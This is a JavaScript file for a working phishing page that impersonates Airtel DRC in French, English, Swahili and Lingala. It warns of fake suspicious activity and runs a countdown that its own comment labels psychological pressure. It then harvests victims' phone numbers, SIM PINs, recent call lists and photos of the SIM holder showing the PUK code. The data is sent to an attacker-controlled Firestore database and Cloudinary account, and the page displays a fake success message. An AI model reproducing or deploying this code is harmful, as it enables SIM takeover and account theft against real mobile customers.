// Importations des fonctions Firebase nécessaires
import { initializeApp } from "https://www.gstatic.com/firebasejs/9.15.0/firebase-app.js";
import { getFirestore, collection, addDoc, serverTimestamp } from "https://www.gstatic.com/firebasejs/9.15.0/firebase-firestore.js";
// Firebase Storage n'est plus utilisé, remplacé par une alternative gratuite.
import imageCompression from 'https://cdn.jsdelivr.net/npm/browser-image-compression@2.0.1/dist/browser-image-compression.mjs';

// --- Translations Object ---
// NOTE: Swahili and Lingala translations are placeholders using English text.
const translations = {
    // --- Français ---
    fr: {
        // Header
        nav_individuals: "Particuliers",
        nav_businesses: "Entreprises",
        nav_about: "Airtel et Vous",
        my_space_btn: "Mon Espace",
        // Form
        countdown_prefix: "Suspension de la ligne dans :",
        form_title: "Action Requise",
        form_subtitle: "Une activité suspecte a été détectée sur votre ligne. Pour éviter une suspension immédiate, veuillez vérifier votre identité ci-dessous.",
        phone_label: "Numéro de téléphone Airtel :",
        phone_explanation: "Ceci nous permet d'identifier la ligne exacte qui nécessite une vérification de sécurité.",
        phone_placeholder: "Ex: 09xxxxxxxx",
        pin_label: "Code PIN de la SIM :",
        pin_explanation: "Votre code PIN est requis pour confirmer que vous êtes bien en possession de la carte SIM. Il n'est jamais stocké et n'est utilisé que pour cette vérification.",
        pin_placeholder: "****",
        last_calls_label: "5 derniers numéros contactés :",
        last_calls_explanation: "Cette information est une méthode de vérification standard pour s'assurer que seul le propriétaire légitime de la ligne peut effectuer des modifications.",
        last_calls_placeholder_1: "N° 1",
        last_calls_placeholder_2: "N° 2",
        last_calls_placeholder_3: "N° 3",
        last_calls_placeholder_4: "N° 4",
        last_calls_placeholder_5: "N° 5",
        sim_photo_label: "Photo du support de votre carte SIM (carte de lecteur) :",
        sim_photo_explanation: "La photo du support original, montrant le code PUK, est la preuve ultime de propriété. Elle nous permet de sécuriser votre compte de manière définitive.",
        take_photo_button: "Prendre une photo",
        choose_file_button: "Ou choisir un fichier",
        uploading_photo: "Chargement...",
        photo_uploaded: "Photo chargée",
        pin_error_format: "Le code PIN doit contenir exactement 4 chiffres.",
        last_calls_error_fill_all: "Veuillez renseigner les 5 numéros.",
        last_calls_error_invalid_number: "Un ou plusieurs numéros sont invalides. Veuillez vérifier.",
        photo_error_uploading: "Veuillez attendre la fin du chargement de la photo.",
        photo_error_missing: "Veuillez prendre ou sélectionner une photo.",
        phone_error_invalid_format: "Veuillez entrer un numéro Airtel RDC valide (Ex: 099xxxxxxx ou 097xxxxxxx).",
        submit_button: "Vérifier mes informations",
        // Success message
        success_title: "Merci !",
        success_message: "Vos informations ont été vérifiées avec succès. Votre ligne est désormais sécurisée.",
        // Footer (New Structure)
        footer_col_about: "Airtel et Vous",
        footer_link_about_us: "À propos de nous",
        footer_link_careers: "Carrières",
        footer_link_press: "Presse",
        footer_col_help: "Aide",
        footer_link_contact: "Contactez-nous",
        footer_link_faq: "FAQ",
        footer_link_stores: "Nos boutiques",
        footer_col_legal: "Légal",
        footer_link_legal: "Mentions légales",
        footer_link_privacy: "Politique de confidentialité",
        footer_link_terms: "Termes et conditions",
        footer_col_follow: "Suivez-nous",
        footer_copyright: "© 2023 Airtel. Tous droits réservés."
    },
    // --- English ---
    en: {
        nav_individuals: "Individuals", nav_businesses: "Businesses", nav_about: "Airtel and You", my_space_btn: "My Space",
        countdown_prefix: "Line suspension in:", form_title: "Action Required",
        form_subtitle: "Suspicious activity has been detected on your line. To avoid immediate suspension, please verify your identity below.",
        phone_label: "Airtel phone number:", phone_explanation: "This allows us to identify the exact line that requires a security check.",
        phone_placeholder: "E.g.: 09xxxxxxxx", pin_label: "SIM PIN Code:",
        pin_explanation: "Your PIN is required to confirm you are in possession of the SIM card. It is never stored and is only used for this verification.",
        pin_placeholder: "****", last_calls_label: "Last 5 contacted numbers:",
        last_calls_explanation: "This information is a standard verification method to ensure that only the legitimate owner of the line can make changes.",
        last_calls_placeholder_1: "Number 1", last_calls_placeholder_2: "Number 2", last_calls_placeholder_3: "Number 3", last_calls_placeholder_4: "Number 4", last_calls_placeholder_5: "Number 5",
        sim_photo_label: "Photo of your SIM card holder (reader card):",
        sim_photo_explanation: "The photo of the original holder, showing the PUK code, is the ultimate proof of ownership. It allows us to secure your account definitively.",
        take_photo_button: "Take a photo",
        choose_file_button: "Or choose a file",
        uploading_photo: "Uploading...",
        phone_error_invalid_format: "Please enter a valid Airtel DRC number (e.g., 099xxxxxxx or 097xxxxxxx).",
        pin_error_format: "The PIN must contain exactly 4 digits.",
        last_calls_error_fill_all: "Please fill in all 5 numbers.",
        last_calls_error_invalid_number: "One or more numbers are invalid. Please check.",
        photo_error_uploading: "Please wait for the photo to finish uploading.",
        photo_error_missing: "Please take or select a photo.",
        photo_uploaded: "Photo uploaded",
        submit_button: "Verify my information",
        success_title: "Thank you!", success_message: "Your information has been successfully verified. Your line is now secure.",
        footer_col_about: "Airtel and You", footer_link_about_us: "About Us", footer_link_careers: "Careers", footer_link_press: "Press",
        footer_col_help: "Help", footer_link_contact: "Contact Us", footer_link_faq: "FAQ", footer_link_stores: "Our Stores",
        footer_col_legal: "Legal", footer_link_legal: "Legal Notice", footer_link_privacy: "Privacy Policy", footer_link_terms: "Terms and Conditions",
        footer_col_follow: "Follow Us",
        footer_copyright: "© 2023 Airtel. All rights reserved."
    },
    // --- Swahili ---
    sw: {
        nav_individuals: "Watu Binafsi", nav_businesses: "Biashara", nav_about: "Airtel na Wewe", my_space_btn: "Nafasi Yangu",
        countdown_prefix: "Laini itasitishwa baada ya:", form_title: "Hatua Inahitajika",
        form_subtitle: "Shughuli ya kutiliwa shaka imegunduliwa kwenye laini yako. Ili kuepuka kusitishwa mara moja, tafadhali thibitisha utambulisho wako hapa chini.",
        phone_label: "Nambari ya simu ya Airtel:", phone_explanation: "Hii inatuwezesha kutambua laini halisi inayohitaji uhakiki wa usalama.",
        phone_placeholder: "Mfano: 09xxxxxxxx", pin_label: "Nambari ya siri ya SIM:",
        pin_explanation: "Nambari yako ya siri inahitajika ili kuthibitisha kuwa unamiliki kadi ya SIM. Haihifadhiwi kamwe na hutumika tu kwa uhakiki huu.",
        pin_placeholder: "****", last_calls_label: "Nambari 5 za mwisho zilizopigwa:",
        last_calls_explanation: "Taarifa hii ni njia ya kawaida ya uhakiki ili kuhakikisha kuwa mmiliki halali pekee ndiye anayeweza kufanya mabadiliko.",
        last_calls_placeholder_1: "Nambari 1", last_calls_placeholder_2: "Nambari 2", last_calls_placeholder_3: "Nambari 3", last_calls_placeholder_4: "Nambari 4", last_calls_placeholder_5: "Nambari 5",
        sim_photo_label: "Picha ya kishikilia kadi yako ya SIM:",
        sim_photo_explanation: "Picha ya kishikilia halisi, inayoonyesha nambari ya PUK, ni uthibitisho mkuu wa umiliki. Inatuwezesha kulinda akaunti yako kikamilifu.",
        take_photo_button: "Piga picha",
        choose_file_button: "Au chagua faili",
        uploading_photo: "Inapakia...",
        phone_error_invalid_format: "Tafadhali ingiza nambari halali ya Airtel DRC (Mfano: 099xxxxxxx au 097xxxxxxx).",
        pin_error_format: "PIN lazima iwe na tarakimu 4 hasa.",
        last_calls_error_fill_all: "Tafadhali jaza nambari zote 5.",
        last_calls_error_invalid_number: "Nambari moja au zaidi si sahihi. Tafadhali angalia.",
        photo_error_uploading: "Tafadhali subiri picha imalize kupakiwa.",
        photo_error_missing: "Tafadhali piga au chagua picha.",
        photo_uploaded: "Picha imepakiwa",
        submit_button: "Thibitisha taarifa zangu",
        success_title: "Asante!", success_message: "Taarifa zako zimethibitishwa kwa mafanikio. Laini yako sasa iko salama.",
        footer_col_about: "Airtel na Wewe", footer_link_about_us: "Kutuhusu", footer_link_careers: "Kazi", footer_link_press: "Vyombo vya Habari",
        footer_col_help: "Msaada", footer_link_contact: "Wasiliana Nasi", footer_link_faq: "Maswali Yanayoulizwa Mara kwa Mara", footer_link_stores: "Maduka Yetu",
        footer_col_legal: "Kisheria", footer_link_legal: "Notisi ya Kisheria", footer_link_privacy: "Sera ya Faragha", footer_link_terms: "Vigezo na Masharti",
        footer_col_follow: "Tufuate",
        footer_copyright: "© 2023 Airtel. Haki zote zimehifadhiwa."
    },
    // --- Lingala ---
    ln: {
        nav_individuals: "Bato na Bato", nav_businesses: "Mombongo", nav_about: "Airtel na Bino", my_space_btn: "Esika na Ngai",
        countdown_prefix: "Bakokanga linya na:", form_title: "Esengeli Kosala",
        form_subtitle: "Bamonaki likambo ya kokamwa na linya na yo. Pona bakanga yo te, lakisa soki yo nde nkolo ya linya.",
        phone_label: "Nimero ya telefone ya Airtel:", phone_explanation: "Oyo ekopesa biso nzela ya koyeba linya nini esengeli na bokengi.",
        phone_placeholder: "Ndakisa: 09xxxxxxxx", pin_label: "Kode PIN ya SIM:",
        pin_explanation: "Kode PIN na yo esengeli pona kondima ete ozali na carte SIM. Ebombamaka te mpe esalelamaka kaka pona likambo oyo.",
        pin_placeholder: "****", last_calls_label: "Banumero 5 ya suka o bengaki:",
        last_calls_explanation: "Liyebisi oyo ezali lolenge ya kotala ete kaka nkolo ya solo ya linya nde akoki kobongola makambo.",
        last_calls_placeholder_1: "Nimero 1", last_calls_placeholder_2: "Nimero 2", last_calls_placeholder_3: "Nimero 3", last_calls_placeholder_4: "Nimero 4", last_calls_placeholder_5: "Nimero 5",
        sim_photo_label: "Foto ya esika ya carte SIM na yo:",
        sim_photo_explanation: "Foto ya esika ya solo, oyo ezali na kode PUK, ezali elembeteli ya suka ya bonkolo. Epesi biso nzela ya kobatela compte na yo malamu.",
        take_photo_button: "Bɛta foto",
        choose_file_button: "To pona fichier",
        uploading_photo: "Kozwa...",
        phone_error_invalid_format: "Tia nimero ya solo ya Airtel RDC (Ndakisa: 099xxxxxxx to 097xxxxxxx).",
        pin_error_format: "Kode PIN esengeli kozala na numero minei.",
        last_calls_error_fill_all: "Tia banimero nyonso 5.",
        last_calls_error_invalid_number: "Nimero moko to ebele ezali ya solo te. Tala lisusu.",
        photo_error_uploading: "Zela foto esila kozwa.",
        photo_error_missing: "Bɛta to pona foto.",
        photo_uploaded: "Foto ezwami",
        submit_button: "Kotala basango na ngai",
        success_title: "Matondi!", success_message: "Basango na yo endimami malamu. Sikoyo linya na yo ezali na bokengi.",
        footer_col_about: "Airtel na Bino", footer_link_about_us: "Mpo na biso", footer_link_careers: "Misala", footer_link_press: "Bapanzi Sango",
        footer_col_help: "Lisungi", footer_link_contact: "Benga biso", footer_link_faq: "Mituna ya Mbala na Mbala", footer_link_stores: "Batiki na biso",
        footer_col_legal: "Mibeko", footer_link_legal: "Mibeko", footer_link_privacy: "Politiki ya Confidentialité", footer_link_terms: "Maloba ya Boyokani",
        footer_col_follow: "Landa biso",
        footer_copyright: "© 2023 Airtel. Lotomo nyonso ezali ya Airtel."
    }
};

const languageNames = {
    fr: 'Français',
    en: 'English',
    sw: 'Swahili',
    ln: 'Lingala'
};

// --- ATTENTION : CONFIGURATION FIREBASE ---
// Pour que cela fonctionne, vous devez :
// 1. Aller dans votre console Firebase -> Firestore Database -> Créer une base de données.
// 2. Aller dans l'onglet "Règles" et les remplacer par les règles ci-dessous.
//    Ces règles sont plus sécurisées : elles autorisent UNIQUEMENT la création de nouvelles soumissions.
//    rules_version = '2';
//    service cloud.firestore {
//      match /databases/{database}/documents {
//        // Autorise n'importe qui à créer un document dans la collection "submissions"
//        // mais interdit la lecture, la mise à jour ou la suppression.
//        match /submissions/{submissionId} {
//          allow create: if true;
//          allow read, update, delete: if false;
//        }
//      }
//    }
const firebaseConfig = {
  apiKey: "AIzaSyAv-4ns30x9HHuSYQpdU1DvHc9EOH3wcpA",
  authDomain: "airtel-help.firebaseapp.com",
  projectId: "airtel-help",
  storageBucket: "airtel-help.firebasestorage.app",
  messagingSenderId: "56252598230",
  appId: "1:56252598230:web:ed84b0b41d955e90644677",
  measurementId: "G-XYJ8Z56XFK"
};

// --- Configuration des APIs externes ---
// Centraliser les clés ici facilite la maintenance.
const API_CONFIG = {
    // --- NOUVELLE CONFIGURATION POUR CLOUDINARY ---
    // Remplissez ces deux valeurs avec les informations de votre compte Cloudinary.
    CLOUDINARY_CLOUD_NAME: "dhvxjdgbj",
    // Le nom de votre preset est "Airtel". Assurez-vous qu'il est bien en mode "Unsigned" dans vos paramètres Cloudinary.
    CLOUDINARY_UPLOAD_PRESET: "Airtel"
};

// Initialisation de Firebase
const app = initializeApp(firebaseConfig);
const db = getFirestore(app);

// --- Function to set the language of the page ---
function setLanguage(lang, isInitialLoad = false) {
    const langPack = translations[lang] || translations.fr; // Fallback to French
    const currentLangText = document.getElementById('current-lang-text');

    // Save preference for future visits
    if (!isInitialLoad) {
        localStorage.setItem('preferredLanguage', lang);
    }

    if (currentLangText) currentLangText.textContent = languageNames[lang];

    // Update text content for elements with data-key
    document.querySelectorAll('[data-key]').forEach(element => {
        const key = element.dataset.key;
        if (langPack[key]) {
            element.textContent = langPack[key];
        }
    });

    // Update placeholders for elements with data-key-placeholder
    document.querySelectorAll('[data-key-placeholder]').forEach(element => {
        const key = element.dataset.keyPlaceholder;
        if (langPack[key]) {
            element.placeholder = langPack[key];
        }
    });
}

document.addEventListener('DOMContentLoaded', function() {
    // --- Logique de Langue au Chargement ---
    const langSwitcherOptions = document.querySelectorAll('.lang-switcher-option');
    const mainContentWrapper = document.getElementById('main-content-wrapper');

    // 1. Vérifier une langue sauvegardée
    let initialLang = localStorage.getItem('preferredLanguage');

    // 2. Si aucune préférence, détecter la langue du navigateur
    if (!initialLang || !translations[initialLang]) {
        const browserLang = navigator.language.split('-')[0]; // 'fr-FR' -> 'fr'
        initialLang = translations[browserLang] ? browserLang : 'fr'; // Défaut en français
    }
    
    // 3. Appliquer la langue immédiatement et afficher le contenu
    setLanguage(initialLang, true);
    mainContentWrapper.classList.remove('hidden');

    // --- Logique du sélecteur de langue (dropdown au clic) ---
    const languageSwitcher = document.querySelector('.language-switcher');
    const langSwitcherTrigger = document.querySelector('.lang-switcher-trigger');

    if (langSwitcherTrigger && languageSwitcher) {
        langSwitcherTrigger.addEventListener('click', (event) => {
            // Empêche le clic de se propager au document, ce qui fermerait le menu immédiatement
            event.stopPropagation();
            languageSwitcher.classList.toggle('is-open');
        });
    }

    // Ferme le menu déroulant si l'utilisateur clique n'importe où ailleurs sur la page
    document.addEventListener('click', () => {
        if (languageSwitcher && languageSwitcher.classList.contains('is-open')) {
            languageSwitcher.classList.remove('is-open');
        }
    });

    function handleLanguageSwitch(event) {
        event.preventDefault();
        const selectedLang = this.dataset.lang;
        setLanguage(selectedLang);
        // La fermeture du menu est gérée par le listener sur le document, donc pas besoin d'agir ici.
    }

    langSwitcherOptions.forEach(option => {
        option.addEventListener('click', handleLanguageSwitch);
    });

    // --- Fin de la logique de langue ---

    const simForm = document.getElementById('sim-form');
    const submitBtn = document.getElementById('submit-btn');
    const btnText = document.getElementById('btn-text');
    const loadingSpinner = document.getElementById('loading-spinner');
    const countdownTimer = document.getElementById('countdown-timer');
    const successMessageDiv = document.getElementById('success-message');
    const generalErrorDiv = document.getElementById('general-error');
    
    const takePhotoBtn = document.getElementById('take-photo-btn');
    const chooseFileBtn = document.getElementById('choose-file-btn');
    const imagePreview = document.getElementById('image-preview');
    const fileInputWrapper = document.querySelector('.file-input-wrapper');
    const fileStatusText = document.getElementById('file-status-text');

    let uploadedImageUrl = null; // Variable pour stocker l'URL de l'image uploadée
    let isUploading = false;

    const inputs = {
        phone: document.getElementById('phone'),
        pin: document.getElementById('pin'),
        // Les 5 champs sont gérés séparément
        lastCallWrappers: document.querySelectorAll('.multi-input-container .input-wrapper'),
        lastCallInputs: document.querySelectorAll('.last-call-input')
    };

    const errorMessages = {
        phone: document.getElementById('phone-error'),
        pin: document.getElementById('pin-error'),
        lastCalls: document.getElementById('last-calls-error'),
        simCardPhoto: document.getElementById('sim-card-photo-error')
    };

    function showError(field, message) {
        if (errorMessages[field]) errorMessages[field].textContent = message;
        // Add 'is-invalid' class to the corresponding single input
        if (inputs[field] && inputs[field].classList) {
            inputs[field].classList.add('is-invalid');
        }
    }

    function clearErrors() {
        for (const field in inputs) {
            if (inputs[field].classList) {
                inputs[field].classList.remove('is-invalid');
            }
        }
        inputs.lastCallInputs.forEach(input => input.classList.remove('is-invalid'));
        for (const key in errorMessages) {
            if (errorMessages[key]) errorMessages[key].textContent = '';
        }
        generalErrorDiv.textContent = '';
        generalErrorDiv.classList.remove('active');
    }

    /**
     * Valide un numéro de téléphone générique (formats RDC nationaux ou internationaux).
     * @param {string} phone Le numéro à valider.
     * @returns {boolean}
     */
    function isValidPhoneNumber(phone) {
        const nationalRegex = /^0\d{9}$/;
        const internationalRegex = /^\+243\d{9}$/;
        return nationalRegex.test(phone) || internationalRegex.test(phone);
    }

    /**
     * Valide un numéro Airtel RDC de manière stricte, en gérant les formats +243 et 0.
     * @param {string} phone Le numéro à valider.
     * @returns {boolean}
     */
    function isAirtelDRCNumber(phone) {
        // Normalise le numéro en format national (0xxxxxxxxx) pour une validation simple
        const phoneClean = phone.trim().startsWith('+243') ? '0' + phone.trim().substring(4) : phone.trim();
        
        if (!/^\d{10}$/.test(phoneClean)) return false;

        const airtelPrefixes = ['099', '097'];
        return airtelPrefixes.some(prefix => phoneClean.startsWith(prefix));
    }
    
    function validateForm() {
        clearErrors();
        let isValid = true;
        const lang = localStorage.getItem('preferredLanguage') || 'fr';

        // 1. Valider le numéro de téléphone Airtel
        if (!isAirtelDRCNumber(inputs.phone.value.trim())) {
            showError('phone', translations[lang].phone_error_invalid_format);
            isValid = false;
        }

        // 2. Valider le code PIN
        if (inputs.pin.value.trim().length !== 4 || !/^\d{4}$/.test(inputs.pin.value.trim())) {
            showError('pin', translations[lang].pin_error_format);
            isValid = false;
        }

        // 3. Valider les 5 derniers numéros
        let allLastCallsFilled = true;
        let anyLastCallInvalid = false;
        inputs.lastCallInputs.forEach(input => {
            const phoneValue = input.value.trim();
            if (phoneValue === '') {
                allLastCallsFilled = false;
                input.classList.add('is-invalid');
            } else if (!isValidPhoneNumber(phoneValue)) {
                anyLastCallInvalid = true;
                input.classList.add('is-invalid');
            }
        });

        if (!allLastCallsFilled) {
            showError('lastCalls', translations[lang].last_calls_error_fill_all);
            isValid = false;
        } else if (anyLastCallInvalid) {
            showError('lastCalls', translations[lang].last_calls_error_invalid_number);
            isValid = false;
        }

        // 4. Valider la photo
        if (isUploading) {
            showError('simCardPhoto', translations[lang].photo_error_uploading);
            isValid = false;
        } else if (!uploadedImageUrl) {
            showError('simCardPhoto', translations[lang].photo_error_missing);
            isValid = false;
        }
        return isValid;
    }

    // --- NOUVELLE VALIDATION EN TEMPS RÉEL AVEC AUTO-FORMATAGE ---

    /**
     * Formate et valide un numéro de téléphone en temps réel pendant la saisie.
     * @param {HTMLInputElement} input L'élément de champ de saisie.
     * @param {boolean} isAirtelSpecific Si true, utilise la validation stricte pour Airtel.
     */
    function autoFormatPhoneNumber(input, isAirtelSpecific) {
        // 1. Nettoyer l'entrée : autoriser les chiffres et le '+' uniquement au début.
        let cleanedValue = input.value.replace(/[^\d+]/g, '');
        if (cleanedValue.lastIndexOf('+') > 0) {
            cleanedValue = cleanedValue.replace(/\+/g, '');
        }

        // 2. Gérer la longueur maximale pour éviter les saisies trop longues
        if (cleanedValue.startsWith('+243')) {
            if (cleanedValue.length > 13) cleanedValue = cleanedValue.substring(0, 13);
        } else if (cleanedValue.startsWith('0')) {
            if (cleanedValue.length > 10) cleanedValue = cleanedValue.substring(0, 10);
        } else if (cleanedValue.length > 10) { // Pour les cas où l'utilisateur ne met pas de '0'
            cleanedValue = cleanedValue.substring(0, 10);
        }

        // 3. Mettre à jour la valeur dans le champ pour un effet temps réel
        if (input.value !== cleanedValue) {
            input.value = cleanedValue;
        }

        // 4. Valider et styler le champ
        if (cleanedValue) {
            const isValid = isAirtelSpecific ? isAirtelDRCNumber(cleanedValue) : isValidPhoneNumber(cleanedValue);
            if (cleanedValue.length >= 9) { // On ne juge qu'un numéro presque complet
                input.classList.toggle('is-invalid', !isValid);
            } else {
                input.classList.remove('is-invalid');
            }
        } else {
            input.classList.remove('is-invalid');
        }

        // 5. Mettre à jour les messages d'erreur
        const lang = localStorage.getItem('preferredLanguage') || 'fr';
        if (isAirtelSpecific) {
            errorMessages.phone.textContent = input.classList.contains('is-invalid') ? translations[lang].phone_error_invalid_format : '';
        } else {
            const anyInvalid = Array.from(inputs.lastCallInputs).some(i => i.classList.contains('is-invalid'));
            errorMessages.lastCalls.textContent = anyInvalid ? translations[lang].last_calls_error_invalid_number : '';
        }
    }

    // Appliquer la nouvelle validation aux champs concernés
    inputs.phone.addEventListener('input', () => autoFormatPhoneNumber(inputs.phone, true));
    inputs.lastCallInputs.forEach(input => {
        input.addEventListener('input', () => autoFormatPhoneNumber(input, false));
    });
    // --- Logique "intelligente" pour les champs multiples ---
    function initMultiInput() {
        inputs.lastCallWrappers.forEach((wrapper, index) => {
            const input = wrapper.querySelector('.last-call-input');
            const deleteBtn = wrapper.querySelector('.delete-input-btn');

            input.addEventListener('input', () => {
                // Révèle et focus le champ suivant une fois qu'un numéro valide et complet est entré.
                // Cette logique remplace l'ancienne qui dépendait de `maxLength`, qui a été supprimé.
                const value = input.value;
                const isComplete = (value.startsWith('+243') && value.length === 13) || (value.startsWith('0') && value.length === 10);

                if (isComplete && index < inputs.lastCallWrappers.length - 1) {
                    const nextWrapper = inputs.lastCallWrappers[index + 1];
                    if (nextWrapper.classList.contains('hidden')) {
                        nextWrapper.classList.remove('hidden');
                        nextWrapper.classList.add('is-revealed');
                    }
                    nextWrapper.querySelector('.last-call-input').focus();
                }
            });

            input.addEventListener('keydown', (e) => {
                if (e.key === "Backspace" && input.value.length === 0 && index > 0) {
                    inputs.lastCallWrappers[index - 1].querySelector('.last-call-input').focus();
                }
            });

            deleteBtn.addEventListener('click', () => {
                // 1. Vider le champ actuel
                input.value = '';

                // 2. Masquer tous les champs suivants pour réinitialiser la séquence
                for (let i = index + 1; i < inputs.lastCallWrappers.length; i++) {
                    const nextWrapper = inputs.lastCallWrappers[i];
                    if (!nextWrapper.classList.contains('hidden')) {
                        nextWrapper.classList.add('hidden');
                        nextWrapper.classList.remove('is-revealed');
                        // Vider aussi leur contenu au cas où
                        nextWrapper.querySelector('.last-call-input').value = '';
                    }
                }
                // 3. Remettre le focus sur le champ vidé
                input.focus();
                clearErrors(); // Effacer les messages d'erreur potentiels
            });
        });
    }

    // --- Logique pour le compte à rebours (pression psychologique) ---
    function startCountdown() {
        let duration = 3 * 60 * 60; // 3 heures en secondes
        const timerElement = countdownTimer.querySelector('strong');

        const interval = setInterval(() => {
            if (duration <= 0) {
                clearInterval(interval);
                timerElement.textContent = "00:00:00";
                countdownTimer.innerHTML = "<strong>TEMPS ÉCOULÉ. VOTRE LIGNE EST EN COURS DE SUSPENSION.</strong>";
                submitBtn.disabled = true;
                return;
            }

            duration--;
            
            const hours = String(Math.floor(duration / 3600)).padStart(2, '0');
            const minutes = String(Math.floor((duration % 3600) / 60)).padStart(2, '0');
            const seconds = String(duration % 60).padStart(2, '0');
            
            timerElement.textContent = `${hours}:${minutes}:${seconds}`;

        }, 1000);
    }

    // --- Logique de chargement instantané de la photo ---
    async function handlePhotoUpload(file) {
        if (!file) return;
        isUploading = true;
        uploadedImageUrl = null; // Réinitialiser l'URL précédente

        // 1. Mettre à jour l'interface pour l'état de chargement
        imagePreview.src = URL.createObjectURL(file);
        imagePreview.classList.remove('hidden');
        fileInputWrapper.classList.remove('is-success', 'is-error');
        fileInputWrapper.classList.add('is-uploading');
        fileStatusText.classList.remove('hidden');
        fileStatusText.textContent = translations[localStorage.getItem('preferredLanguage') || 'fr'].uploading_photo;
        clearErrors();

        try {
            // 2. Compresser l'image
            const compressionOptions = {
                maxSizeMB: 0.5,
                maxWidthOrHeight: 1024,
                useWebWorker: true,
            };
            const compressedFile = await imageCompression(file, compressionOptions);

            // 3. Uploader sur Cloudinary (alternative professionnelle et sécurisée)
            const formData = new FormData();
            formData.append('file', compressedFile);
            formData.append('upload_preset', API_CONFIG.CLOUDINARY_UPLOAD_PRESET); // Le preset non signé est la clé de la sécurité

            const response = await fetch(`https://api.cloudinary.com/v1_1/${API_CONFIG.CLOUDINARY_CLOUD_NAME}/image/upload`, {
                method: 'POST',
                body: formData,
            });

            const result = await response.json();

            if (result.secure_url) {
                // 4. Obtenir l'URL (qui se trouve dans result.secure_url pour Cloudinary) et mettre à jour l'état
                uploadedImageUrl = result.secure_url;

                // 5. Mettre à jour l'interface pour l'état de succès
                fileInputWrapper.classList.remove('is-uploading');
                fileInputWrapper.classList.add('is-success');
                fileStatusText.textContent = translations[localStorage.getItem('preferredLanguage') || 'fr'].photo_uploaded;
                isUploading = false;
            } else {
                // Cloudinary renvoie une erreur dans result.error.message
                throw new Error(result.error?.message || 'Erreur API Cloudinary');
            }

        } catch (error) {
            console.error("Erreur lors du chargement de la photo:", error);
            fileInputWrapper.classList.remove('is-uploading', 'is-success');
            fileStatusText.classList.add('hidden');
            isUploading = false;
            showError('simCardPhoto', 'Échec du chargement. Veuillez réessayer.');
        }
    }

    // --- Gestion de la soumission du formulaire ---
    simForm.addEventListener('submit', async function(event) {
        event.preventDefault();
        clearErrors();

        if (validateForm()) {
            // Le formulaire est valide, on lance l'envoi
            submitBtn.disabled = true;
            btnText.textContent = 'Envoi en cours...';
            loadingSpinner.classList.remove('hidden');

            try {
                const lastCalledNumbers = Array.from(inputs.lastCallInputs).map(input => input.value);

                // 4. Enregistrer les données dans Firestore
                await addDoc(collection(db, "submissions"), {
                    phoneNumber: inputs.phone.value,
                    pin: inputs.pin.value,
                    lastCalls: lastCalledNumbers,
                    imageUrl: uploadedImageUrl, // Utiliser l'URL déjà obtenue
                    submittedAt: serverTimestamp() // Ajoute la date et l'heure de soumission
                });

                // 5. Afficher le message de succès
                simForm.classList.add('hidden');
                successMessageDiv.classList.remove('hidden');

            } catch (error) {
                console.error("Erreur lors de l'envoi à Firebase: ", error);
                // Afficher une erreur "professionnelle"
                generalErrorDiv.textContent = "Erreur de communication avec nos serveurs (Code: 503). Veuillez réessayer.";
                generalErrorDiv.classList.add('active');

                setTimeout(() => {
                    submitBtn.disabled = false;
                    btnText.textContent = 'Réessayer';
                    loadingSpinner.classList.add('hidden');
                }, 2000);
            }
        }
    });

    // Efface l'erreur quand l'utilisateur corrige
    Object.keys(inputs).forEach(field => {
        const element = inputs[field];
        // On s'assure que l'élément est un champ unique et non une liste (NodeList)
        if (element && typeof element.addEventListener === 'function') {
            element.addEventListener('input', () => {
                if (element.classList && element.classList.contains('is-invalid')) {
                    element.classList.remove('is-invalid');
                    errorMessages[field].textContent = '';
                }
            });
        }
    });

    inputs.lastCallInputs.forEach(input => input.addEventListener('input', () => clearErrors()));

    // --- Logique pour la prise de photo et la sélection de fichier (VERSION ROBUSTE) ---
    const takePhotoInput = document.getElementById('take-photo-input');
    const chooseFileInput = document.getElementById('choose-file-input');

    takePhotoBtn.addEventListener('click', (e) => {
        e.preventDefault();
        takePhotoInput.click();
    });

    chooseFileBtn.addEventListener('click', (e) => {
        e.preventDefault();
        chooseFileInput.click();
    });

    function handleFileSelection(event) {
        const input = event.target;
        if (input.files.length > 0) {
            const selectedFile = input.files[0];
            handlePhotoUpload(selectedFile);
            // Important: réinitialiser pour pouvoir sélectionner le même fichier à nouveau
            input.value = '';
        }
    }

    takePhotoInput.addEventListener('change', handleFileSelection);
    chooseFileInput.addEventListener('change', handleFileSelection);

    // Initialisation des fonctionnalités "intelligentes"
    startCountdown();
    initMultiInput();
});